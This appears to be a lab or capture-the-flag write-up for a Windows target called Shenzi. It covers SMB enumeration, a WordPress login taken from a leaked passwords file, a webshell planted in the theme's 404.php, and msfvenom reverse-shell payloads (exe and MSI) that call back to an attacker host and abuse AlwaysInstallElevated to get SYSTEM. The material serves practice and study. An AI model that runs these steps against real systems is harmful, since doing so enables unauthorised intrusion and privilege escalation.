# Shenzi
## SMB, Wordpress, AlwaysInstallElevated.msi
## nmap
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
80/tcp   open  http          Apache httpd 2.4.43 
((Win64) OpenSSL/1.1.1g PHP/7.4.6)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.43 (
(Win64) OpenSSL/1.1.1g PHP/7.4.6)
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
5040/tcp open  unknown
```
## SMB, passwords.txt
```
smbclient -U ''  -L \\\\192.168.235.55\\
smbclient -U ''  \\\\192.168.235.55\\Shenzi

Download files:
recurse
prompt off
mget **

The contents of passwords.txt is intriguing.
Out of all of the credentials above the Wordpress one was potentially the most interesting.
Further checks for phpmyadmin and webdav showed both are not running or inaccessible outside of local access on the target machine.
```
## Dirsearch
```

Dirsearch.py against port 80 showed no interesting directories.
```
## Wordpress /shenzi/wp-admin/
```
Wordpress is potentially installed and Wordpress sites do not have to exist in the directory of /wordpress/, /Shenzi/ proves successful. 
Login with the credentials of admin:FeltHeadwallWight357
```
## Theme Editor
```
Heading over to Appearance > Theme editor I was able to edit the contents of the 404.php file and insert a webshell.
After saving changes and browsing to http://192.168.235.55/shenzi/404.php, we now have a webshell with RCE.

From here I created a msfvenom reverse shell:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.235 LPORT=8082 -f exe > /home/kali/windows/reverseshell.exe
Uploaded the PHP webshell and set a netcat listener on port 21.
After uploading the shell through the webshell I then executed and recieved a shell back.
```
## winpeas, AlwaysInstallElevated
```
AlwaysInstallElevated is set to 1 in the HKLM/HKCU
With this we can create a malicious MSI file with msfvenom and when executed will be run in the context of SYSTEM.
```
## msi file
```
Create an MSI revshell: msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=21 -f msi > /home/kali/windows/priv.msi
Set up a netcat listener on the attacking machine. Download the .msi and execute to get a shell on the listener as SYSTEM.
```










